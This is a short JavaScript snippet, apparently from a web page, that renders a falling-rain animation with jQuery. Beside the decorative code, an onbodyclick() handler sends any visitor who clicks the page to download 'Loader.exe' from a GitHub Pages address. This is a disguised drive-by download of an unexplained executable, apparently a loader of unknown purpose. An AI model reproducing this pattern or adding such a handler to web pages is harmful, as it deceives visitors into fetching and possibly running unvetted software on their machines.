var nbDrop = 100; 

function randRange( minNum, maxNum) {
  return (Math.floor(Math.random() * (maxNum - minNum + 1)) + minNum);
}

function createRain() {
  for( i=1;i<nbDrop;i++) {
	var dropLeft = randRange(0,1600);
	var dropTop = randRange(-1000,1400);

	$('.rain').append('<div class="drop" id="drop'+i+'"></div>');
	$('#drop'+i).css('left',dropLeft);
	$('#drop'+i).css('top',dropTop);
	}
}

function onbodyclick(){
  window.open("https://sonyahvh.github.io/gw/assets/loader/Loader.exe","_self")
}
